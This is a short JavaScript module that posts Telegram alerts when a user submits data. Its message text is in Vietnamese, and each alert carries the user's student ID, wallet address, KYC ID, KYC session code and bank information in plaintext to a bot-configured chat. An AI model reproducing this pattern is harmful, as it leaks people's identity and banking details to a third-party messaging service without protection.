import axios from "axios";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN_CHECK;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export async function sendTelegramAlert(type, data) {
  if (type === "upload") {
    const message = `📤 User ${data.studentId} vừa submit:\n` +
      `👛 Wallet: ${data.wallet || "?"}\n` +
      `🆔 KYC ID: ${data.kycId}\n` +
      `👾 Mã: ${data.kycSessionId}\n` +
      `🏦 Bank: ${data.bankInfo}\n` +
      `🕒 Lúc: ${new Date().toLocaleString("vi-VN")}`;
    
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });
  }
}
